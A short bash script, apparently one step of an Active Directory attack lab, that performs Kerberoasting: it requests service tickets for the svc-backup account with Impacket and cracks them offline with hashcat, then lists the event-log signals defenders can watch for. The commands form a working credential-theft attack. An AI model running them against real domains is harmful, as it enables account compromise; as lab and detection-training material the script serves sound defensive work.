#!/usr/bin/env bash
# Step 3: Request the service ticket for the SPN account and crack it offline.
source "$(dirname "$0")/00-config.sh"
assert_lab_target "$DC_IP"

banner "03 KERBEROAST - svc-backup"
atk "T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting"

HASHES="$LOOT/kerberoast.hashes"
echo "[*] Requesting roastable tickets via Impacket GetUserSPNs..."
impacket-GetUserSPNs "$DOMAIN/$VENDOR_USER:$VENDOR_PASS" -dc-ip "$DC_IP" -request -outputfile "$HASHES"

echo "[*] Cracking offline with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)..."
echo "    Lab wordlist is deterministic; rockyou + rules is the realistic path."
WORDLIST="$(dirname "$0")/../wordlists/lab-seasons.txt"
hashcat -m 13100 -a 0 "$HASHES" "$WORDLIST" --potfile-disable -o "$LOOT/cracked.txt" || true
echo "[+] If cracked, svc-backup's password is in $LOOT/cracked.txt (expect: Autumn2024!)."

expect "4769 Kerberos service ticket request for the svc-backup SPN with RC4 (0x17)."
expect "Cracking itself is OFFLINE - invisible to the SIEM. The 4769 is your signal."
